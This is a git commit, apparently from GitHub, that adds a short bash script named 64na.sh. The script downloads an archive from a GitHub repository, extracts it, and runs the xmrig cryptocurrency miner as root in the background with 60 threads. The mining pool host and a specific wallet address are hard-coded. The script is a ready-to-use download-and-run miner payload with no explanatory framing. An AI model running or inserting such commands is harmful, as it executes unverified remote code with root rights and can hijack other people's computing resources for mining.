32aec8a587029e0e4f8f74393d34a950ae1b42b8
prendibs <94189491+prendibs@users.noreply.github.com>
2024-03-17 06:42:33 +0700

    Create 64na.sh

---
+++ 64na.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+#love u fika
+
+wget https://github.com/prendibs/vl/raw/main/x.tar.gz && tar xf x.tar.gz
+sudo ./xmrig -B -o us-zephyr.miningocean.org:5332 -u ZEPHs9qyUjPfbebw44nveyf2XqZ2sotqRd8ntp8SyPZMj4tDSZeCX9mJnkroee214rN6ZWNm7kroFe1dB5Rnf3DG2zKRHCKPFJ9 -p xna -a rx/0 -t 60
